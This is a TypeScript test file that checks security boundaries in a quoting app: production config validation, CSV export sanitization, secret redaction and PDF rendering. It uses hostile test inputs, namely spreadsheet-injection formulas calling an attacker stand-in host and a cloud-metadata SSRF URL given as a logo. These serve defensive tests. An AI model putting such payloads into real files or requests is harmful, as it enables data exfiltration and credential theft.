import { afterEach, describe, expect, it, vi } from "vitest";
import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { parseEnv } from "../../src/config/env.js";
import {
  CURRENT_PRIVACY_POLICY_VERSION as API_PRIVACY_POLICY_VERSION,
  CURRENT_TERMS_VERSION as API_TERMS_VERSION,
} from "../../src/lib/legal.js";
import { generateQuotePdfBuffer } from "../../src/services/quote-pdf.js";
import { buildQuickBooksInvoiceCsv } from "../../src/services/quickbooks-csv.js";
import {
  CURRENT_PRIVACY_POLICY_VERSION as WEB_PRIVACY_POLICY_VERSION,
  CURRENT_TERMS_VERSION as WEB_TERMS_VERSION,
} from "../../web/src/lib/legal.js";

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("security boundary helpers", () => {
  const productionDatabaseEnv = {
    DATABASE_URL: "postgresql://quotefly_runtime:test@example.invalid/quotefly",
    QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "false",
    QUICKBOOKS_HOSTED_PAYMENTS_ENABLED: "false",
    QUICKBOOKS_RECONCILIATION_WORKER_ENABLED: "false",
    QUICKBOOKS_CDC_WORKER_ENABLED: "false",
  } as const;

  it("keeps browser and API legal acceptance versions synchronized", () => {
    expect(WEB_TERMS_VERSION).toBe(API_TERMS_VERSION);
    expect(WEB_PRIVACY_POLICY_VERSION).toBe(API_PRIVACY_POLICY_VERSION);
  });

  it("rejects production cross-site session cookies until CSRF protection exists", () => {
    expect(() =>
      parseEnv({
        ...process.env,
        NODE_ENV: "production",
        ...productionDatabaseEnv,
        JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
        APP_URL: "https://app.quotefly.example",
        API_URL: "https://api.quotefly.example",
        SESSION_COOKIE_SAME_SITE: "none",
        ENABLE_TWILIO_SMS: "false",
      }),
    ).toThrow(/explicit CSRF protection/i);
  });

  it("rejects production Twilio enablement until sender authorization exists", () => {
    expect(() =>
      parseEnv({
        ...process.env,
        NODE_ENV: "production",
        ...productionDatabaseEnv,
        JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
        APP_URL: "https://app.quotefly.example",
        API_URL: "https://api.quotefly.example",
        SESSION_COOKIE_SAME_SITE: "lax",
        ENABLE_TWILIO_SMS: "true",
        TWILIO_WEBHOOK_AUTH_TOKEN: "configured-verifier",
      }),
    ).toThrow(/until sender authorization is implemented/i);
  });

  it("requires HTTPS for production app and API URLs", () => {
    expect(() =>
      parseEnv({
        ...process.env,
        NODE_ENV: "production",
        ...productionDatabaseEnv,
        JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
        APP_URL: "http://app.quotefly.example",
        API_URL: "https://api.quotefly.example",
        SESSION_COOKIE_SAME_SITE: "lax",
        ENABLE_TWILIO_SMS: "false",
      }),
    ).toThrow(/APP_URL must use HTTPS/i);

    expect(() =>
      parseEnv({
        ...process.env,
        NODE_ENV: "production",
        ...productionDatabaseEnv,
        JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
        APP_URL: "https://app.quotefly.example",
        API_URL: "http://api.quotefly.example",
        SESSION_COOKIE_SAME_SITE: "lax",
        ENABLE_TWILIO_SMS: "false",
      }),
    ).toThrow(/API_URL must use HTTPS/i);
  });

  it("requires production URLs to be bare trusted origins", () => {
    for (const APP_URL of [
      "https://user:secret@app.quotefly.example",
      "https://app.quotefly.example/reset-password",
      "https://app.quotefly.example?redirect=attacker",
      "https://app.quotefly.example#fragment",
    ]) {
      expect(() =>
        parseEnv({
          ...process.env,
          NODE_ENV: "production",
          ...productionDatabaseEnv,
          JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
          APP_URL,
          API_URL: "https://api.quotefly.example",
          SESSION_COOKIE_SAME_SITE: "lax",
          ENABLE_TWILIO_SMS: "false",
        }),
      ).toThrow(/bare production origin/i);
    }
  });

  it("fails production startup when paid billing or password recovery is not configured", () => {
    const productionEnv = {
      ...process.env,
      NODE_ENV: "production",
      ...productionDatabaseEnv,
      JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
      APP_URL: "https://app.quotefly.example",
      API_URL: "https://api.quotefly.example",
      SESSION_COOKIE_SAME_SITE: "lax",
      ENABLE_TWILIO_SMS: "false",
      AI_RAG_ROLLOUT_MODE: "off",
      STRIPE_SECRET_KEY: ["sk", "live", "quotefly", "test", "value"].join("_"),
      STRIPE_WEBHOOK_SECRET: ["whsec", "quotefly", "test", "value"].join("_"),
      STRIPE_PRICE_ID_STARTER: "price_quotefly_basic",
      STRIPE_COUPON_ID_BASIC_FIRST_MONTH_HALF_OFF: "quotefly_basic_first_month_half_off",
      STRIPE_PRICE_ID_PROFESSIONAL: "",
      STRIPE_PRICE_ID_ENTERPRISE: "",
      RESEND_API_KEY: "re_quotefly_test_value",
      PASSWORD_RESET_EMAIL_FROM: "QuoteFly <support@quotefly.example>",
    } satisfies NodeJS.ProcessEnv;

    expect(() => parseEnv(productionEnv)).not.toThrow();
    expect(() => parseEnv({ ...productionEnv, DATABASE_URL: "postgresql://migration_owner:test@example.invalid/quotefly" })).toThrow(
      /dedicated quotefly_runtime role/i,
    );
    expect(() => parseEnv({
      ...productionEnv,
      DIRECT_DATABASE_URL: "postgresql://migration_owner:test@example.invalid/quotefly",
    })).toThrow(/must not be present in the production API runtime/i);
    expect(() => parseEnv({ ...productionEnv, STRIPE_WEBHOOK_SECRET: "" })).toThrow(
      /STRIPE_WEBHOOK_SECRET must be configured for a paid production launch/i,
    );
    expect(() =>
      parseEnv({ ...productionEnv, STRIPE_COUPON_ID_BASIC_FIRST_MONTH_HALF_OFF: "" }),
    ).toThrow(/STRIPE_COUPON_ID_BASIC_FIRST_MONTH_HALF_OFF must be configured for a paid production launch/i);
    expect(() => parseEnv({ ...productionEnv, RESEND_API_KEY: "", PASSWORD_RESET_EMAIL_FROM: "" })).toThrow(
      /RESEND_API_KEY must be configured for a paid production launch/i,
    );
    expect(() =>
      parseEnv({
        ...productionEnv,
        STRIPE_PRICE_ID_PROFESSIONAL: productionEnv.STRIPE_PRICE_ID_STARTER,
      }),
    ).toThrow(/Stripe plan price ids must be unique/i);

    const quickBooksProductionEnv = {
      ...productionEnv,
      QUICKBOOKS_CLIENT_ID: "quickbooks-production-client",
      QUICKBOOKS_CLIENT_SECRET: "quickbooks-production-secret",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY_PREVIOUS: "",
    } satisfies NodeJS.ProcessEnv;
    expect(() => parseEnv(quickBooksProductionEnv)).not.toThrow();
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
    })).not.toThrow();
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: quickBooksProductionEnv.JWT_SECRET,
    })).toThrow(/must be independent from JWT_SECRET/i);
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY_PREVIOUS: "short-previous-key",
    })).toThrow(/PREVIOUS must be at least 32 characters/i);

    const quickBooksDevelopmentEnv = {
      ...quickBooksProductionEnv,
      NODE_ENV: "development",
      QUICKBOOKS_ENVIRONMENT: "sandbox",
      QUICKBOOKS_REDIRECT_URI: "https://api.quotefly.example/v1/integrations/quickbooks/callback",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "",
      QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
    } satisfies NodeJS.ProcessEnv;
    expect(() => parseEnv(quickBooksDevelopmentEnv)).toThrow(
      /must be at least 32 characters and independent from JWT_SECRET when QuickBooks provider workflows are enabled/i,
    );
    expect(() => parseEnv({
      ...quickBooksDevelopmentEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: quickBooksDevelopmentEnv.JWT_SECRET,
    })).toThrow(/must be independent from JWT_SECRET/i);
    expect(() => parseEnv({
      ...quickBooksDevelopmentEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
    })).not.toThrow();
    expect(() => parseEnv({
      ...quickBooksDevelopmentEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_OAUTH_ONLY_MODE: "true",
      QUICKBOOKS_WEBHOOK_VERIFIER: "",
      QUICKBOOKS_HOSTED_PAYMENTS_ENABLED: "false",
      QUICKBOOKS_RECONCILIATION_WORKER_ENABLED: "false",
      QUICKBOOKS_CDC_WORKER_ENABLED: "false",
    })).not.toThrow();
    expect(() => parseEnv({
      ...quickBooksDevelopmentEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_OAUTH_ONLY_MODE: "true",
      QUICKBOOKS_RECONCILIATION_WORKER_ENABLED: "true",
    })).toThrow(/must remain disabled in OAuth-only mode/i);
    expect(() => parseEnv({
      ...quickBooksDevelopmentEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_ENVIRONMENT: "production",
      QUICKBOOKS_OAUTH_ONLY_MODE: "true",
    })).toThrow(/restricted to sandbox staging/i);
    expect(() => parseEnv({
      ...quickBooksDevelopmentEnv,
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      APP_URL: "https://www.quotefly.us",
      API_URL: "https://api.quotefly.us",
    })).toThrow(/QuickBooks sandbox workflows are forbidden on QuoteFly production origins/i);

    expect(parseEnv(productionEnv).QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED).toBe(false);
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
    })).toThrow(/must be at least 32 characters and independent from JWT_SECRET when QuickBooks provider workflows are enabled/i);
    expect(() => parseEnv({
      ...productionEnv,
      QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
      QUICKBOOKS_CLIENT_ID: "",
      QUICKBOOKS_CLIENT_SECRET: "",
    })).toThrow(/client credentials must be configured/i);
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_ENVIRONMENT: "sandbox",
    })).toThrow(/explicitly approved staging origins/i);
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      APP_URL: "https://staging-app.quotefly.example",
      API_URL: "https://staging-api.quotefly.example",
      QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_ENVIRONMENT: "sandbox",
      QUICKBOOKS_SANDBOX_STAGING_ORIGINS: "https://staging-app.quotefly.example,https://staging-api.quotefly.example",
      QUICKBOOKS_REDIRECT_URI: "https://staging-api.quotefly.example/v1/integrations/quickbooks/callback",
    })).not.toThrow();
    for (const invalidRedirectUri of [
      "https://other-staging-api.quotefly.example/v1/integrations/quickbooks/callback",
      "https://staging-api.quotefly.example/v1/integrations/quickbooks/connect",
      "https://staging-api.quotefly.example/v1/integrations/quickbooks/callback?source=test",
      "https://staging-api.quotefly.example/v1/integrations/quickbooks/callback#fragment",
    ]) {
      expect(() => parseEnv({
        ...quickBooksProductionEnv,
        APP_URL: "https://staging-app.quotefly.example",
        API_URL: "https://staging-api.quotefly.example",
        QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
        QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
        QUICKBOOKS_ENVIRONMENT: "sandbox",
        QUICKBOOKS_SANDBOX_STAGING_ORIGINS: "https://staging-app.quotefly.example,https://staging-api.quotefly.example",
        QUICKBOOKS_REDIRECT_URI: invalidRedirectUri,
      })).toThrow(/must exactly match/i);
    }
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      APP_URL: "https://www.quotefly.us",
      API_URL: "https://api.quotefly.us",
      QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_ENVIRONMENT: "sandbox",
      QUICKBOOKS_SANDBOX_STAGING_ORIGINS: "https://www.quotefly.us,https://api.quotefly.us",
    })).toThrow(/forbidden on QuoteFly production origins/i);
    expect(() => parseEnv({
      ...quickBooksProductionEnv,
      QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
      QUICKBOOKS_TOKEN_ENCRYPTION_KEY: "independent-quickbooks-token-key-000001",
      QUICKBOOKS_ENVIRONMENT: "production",
      QUICKBOOKS_REDIRECT_URI: "http://api.quotefly.example/v1/integrations/quickbooks/callback",
    })).toThrow(/QUICKBOOKS_REDIRECT_URI must use HTTPS/i);
  });

  it("validates the shared production rate-limit store when scale-out is enforced", () => {
    const base = {
      ...process.env,
      NODE_ENV: "production",
      ...productionDatabaseEnv,
      JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
      APP_URL: "https://app.quotefly.example",
      API_URL: "https://api.quotefly.example",
      SESSION_COOKIE_SAME_SITE: "lax",
      ENABLE_TWILIO_SMS: "false",
      AI_RAG_ROLLOUT_MODE: "off",
      STRIPE_SECRET_KEY: ["sk", "live", "quotefly", "test", "value"].join("_"),
      STRIPE_WEBHOOK_SECRET: ["whsec", "quotefly", "test", "value"].join("_"),
      STRIPE_PRICE_ID_STARTER: "price_quotefly_basic",
      STRIPE_COUPON_ID_BASIC_FIRST_MONTH_HALF_OFF: "quotefly_basic_first_month_half_off",
      RESEND_API_KEY: "re_quotefly_test_value",
      PASSWORD_RESET_EMAIL_FROM: "QuoteFly <support@quotefly.example>",
    } satisfies NodeJS.ProcessEnv;

    expect(() => parseEnv({ ...base, RATE_LIMIT_REQUIRE_SHARED_STORE: "true", RATE_LIMIT_REDIS_URL: "" })).toThrow(
      /required when shared rate limiting is enforced/i,
    );
    expect(() => parseEnv({ ...base, RATE_LIMIT_REQUIRE_SHARED_STORE: "true", RATE_LIMIT_REDIS_URL: "https://redis.example" })).toThrow(
      /valid redis:\/\/ or rediss:\/\//i,
    );
    expect(() => parseEnv({ ...base, RATE_LIMIT_REQUIRE_SHARED_STORE: "true", RATE_LIMIT_REDIS_URL: "rediss://redis.example:6380" })).not.toThrow();
  });

  it("keeps production RAG default-off and validates shadow, allowlist, and worker rollout boundaries", () => {
    const base = {
      ...process.env,
      NODE_ENV: "production",
      ...productionDatabaseEnv,
      JWT_SECRET: "unique-production-jwt-secret-that-is-long-enough",
      APP_URL: "https://app.quotefly.example",
      API_URL: "https://api.quotefly.example",
      SESSION_COOKIE_SAME_SITE: "lax",
      ENABLE_TWILIO_SMS: "false",
      STRIPE_SECRET_KEY: ["sk", "live", "quotefly", "test", "value"].join("_"),
      STRIPE_WEBHOOK_SECRET: ["whsec", "quotefly", "test", "value"].join("_"),
      STRIPE_PRICE_ID_STARTER: "price_quotefly_basic",
      STRIPE_COUPON_ID_BASIC_FIRST_MONTH_HALF_OFF: "quotefly_basic_first_month_half_off",
      RESEND_API_KEY: "re_quotefly_test_value",
      PASSWORD_RESET_EMAIL_FROM: "QuoteFly <support@quotefly.example>",
      OPENAI_API_KEY: "",
      AI_RAG_ROLLOUT_MODE: undefined,
      AI_RAG_TENANT_ALLOWLIST: "",
      ENABLE_AI_INDEX_WORKER: "false",
      AI_INDEX_INLINE_REFRESH: "true",
    } satisfies NodeJS.ProcessEnv;

    expect(parseEnv(base).AI_RAG_ROLLOUT_MODE).toBe("off");
    expect(() => parseEnv({ ...base, AI_RAG_ROLLOUT_MODE: "all" })).toThrow(
      /OPENAI_API_KEY is required before production RAG can be enabled/i,
    );
    expect(() => parseEnv({
      ...base,
      AI_RAG_ROLLOUT_MODE: "allowlist",
      OPENAI_API_KEY: "test-openai-key",
    })).toThrow(/must contain at least one tenant id/i);
    expect(() => parseEnv({
      ...base,
      AI_RAG_ROLLOUT_MODE: "allowlist",
      AI_RAG_TENANT_ALLOWLIST: "tenant good",
      OPENAI_API_KEY: "test-openai-key",
    })).toThrow(/only comma-separated tenant ids/i);
    expect(() => parseEnv({
      ...base,
      AI_RAG_ROLLOUT_MODE: "off",
      ENABLE_AI_INDEX_WORKER: "true",
    })).toThrow(/cannot be enabled while AI_RAG_ROLLOUT_MODE=off/i);
    expect(() => parseEnv({
      ...base,
      AI_RAG_ROLLOUT_MODE: "allowlist",
      AI_RAG_TENANT_ALLOWLIST: "tenant-a",
      OPENAI_API_KEY: "test-openai-key",
      AI_INDEX_INLINE_REFRESH: "false",
      ENABLE_AI_INDEX_WORKER: "false",
    })).toThrow(/requires AI_INDEX_INLINE_REFRESH=true or ENABLE_AI_INDEX_WORKER=true/i);
    expect(parseEnv({
      ...base,
      AI_RAG_ROLLOUT_MODE: "shadow_allowlist",
      AI_RAG_TENANT_ALLOWLIST: "tenant-a",
      OPENAI_API_KEY: "test-openai-key",
    }).AI_RAG_ROLLOUT_MODE).toBe("shadow_allowlist");
  });

  it("neutralizes spreadsheet formulas in tenant-controlled QuickBooks CSV cells", () => {
    const csv = buildQuickBooksInvoiceCsv(
      [
        {
          id: "quote-security-test",
          title: "=HYPERLINK(\"https://attacker.invalid\")",
          serviceType: "@malicious",
          status: "ACCEPTED",
          scopeText: "scope",
          customerPriceSubtotal: 100,
          taxAmount: 8,
          totalAmount: 108,
          createdAt: new Date("2026-07-29T00:00:00.000Z"),
          customer: {
            fullName: "+SUM(1,1)",
            email: "-cmd@example.invalid",
            phone: "\t=1+1",
          },
          lineItems: [{ description: "=WEBSERVICE(\"https://attacker.invalid\")", quantity: 2, unitPrice: 50 }],
        },
      ],
      { exportedAt: new Date("2026-07-29T00:00:00.000Z") },
    );

    expect(csv).toContain("\"'+SUM(1,1)\"");
    expect(csv).toContain("'-cmd@example.invalid");
    expect(csv).toContain("'\t=1+1");
    expect(csv).toContain("'@malicious Service");
    expect(csv).toContain("\"'=WEBSERVICE(\"\"https://attacker.invalid\"\")\"");
    expect(csv).toContain(",2.00,50.00,100.00,8.00,108.00,");
  });

  it("audits fixed infrastructure profiles without emitting raw values", () => {
    const sentinel = "quickbooks-client-secret-must-never-appear-in-output";
    const result = spawnSync(
      process.execPath,
      [
        fileURLToPath(new URL("../../scripts/infrastructure-variable-audit.mjs", import.meta.url)),
        "--profile",
        "quickbooks",
      ],
      {
        encoding: "utf8",
        env: {
          ...process.env,
          NODE_ENV: "test",
          DATABASE_URL: "database-audit-sentinel",
          DIRECT_DATABASE_URL: "",
          JWT_SECRET: "jwt-audit-sentinel",
          QUICKBOOKS_CLIENT_ID: "quickbooks-client-id-safe-for-test",
          QUICKBOOKS_CLIENT_SECRET: sentinel,
          QUICKBOOKS_ENVIRONMENT: "sandbox",
          QUICKBOOKS_REDIRECT_URI: "https://api.example.test/v1/integrations/quickbooks/callback",
          QUICKBOOKS_WEBHOOK_VERIFIER: "quickbooks-webhook-verifier-sentinel",
          QUICKBOOKS_TOKEN_ENCRYPTION_KEY: sentinel,
          QUICKBOOKS_PROVIDER_WORKFLOWS_ENABLED: "true",
        },
      },
    );

    expect(result.status).toBe(0);
    const report = JSON.parse(result.stdout) as {
      schema: string;
      evidenceScope: string;
      profile: string;
      outcome: string;
      required: Array<{ name: string; classification: string; status: string }>;
      forbidden: Array<{ name: string; classification: string; status: string }>;
    };
    expect(report.schema).toBe("quotefly.infrastructure-variable-audit/v1");
    expect(report.evidenceScope).toBe("current-runtime-only");
    expect(report.profile).toBe("quickbooks");
    expect(report.outcome).toBe("pass");
    expect(report.required).toContainEqual({
      name: "QUICKBOOKS_CLIENT_SECRET",
      classification: "secret",
      status: "configured",
    });
    expect(result.stderr).not.toContain(sentinel);
    expect(result.stdout).not.toContain(sentinel);

    const gitignore = readFileSync(new URL("../../.gitignore", import.meta.url), "utf8");
    expect(gitignore).toMatch(/^\.env\.\*$/m);
    expect(gitignore).toMatch(/^\.railway\/$/m);
    expect(gitignore).toMatch(/^\.vercel\/$/m);
    expect(gitignore).toMatch(/^\.neon\/$/m);

    const repositoryRoot = fileURLToPath(new URL("../../", import.meta.url));
    expect(spawnSync("git", ["check-ignore", "-q", "--", ".env.staging.local"], { cwd: repositoryRoot }).status).toBe(0);
    expect(spawnSync("git", ["check-ignore", "-q", "--", ".env.example"], { cwd: repositoryRoot }).status).toBe(1);
  });

  it("does not fetch a tenant-controlled remote logo while rendering a quote PDF", async () => {
    const fetchSpy = vi.fn(() => {
      throw new Error("remote logo fetch must not occur");
    });
    vi.stubGlobal("fetch", fetchSpy);

    const pdf = await generateQuotePdfBuffer({
      quoteId: "quote-security-test",
      serviceType: "General",
      status: "DRAFT",
      title: "Safe quote",
      scopeText: "Scoped work",
      createdAt: new Date("2026-07-29T00:00:00.000Z"),
      sentAt: null,
      customerPriceSubtotal: 100,
      taxAmount: 8,
      totalAmount: 108,
      customer: { fullName: "Customer", email: null, phone: "5555550100" },
      tenant: { name: "Tenant", timezone: "UTC" },
      branding: {
        templateId: "modern",
        primaryColor: "#2563eb",
        logoUrl: "http://169.254.169.254/latest/meta-data/",
        showQuoteFlyAttribution: false,
      },
      lineItems: [{ description: "Work", quantity: 1, unitPrice: 100 }],
    });

    expect(pdf.subarray(0, 4).toString()).toBe("%PDF");
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});
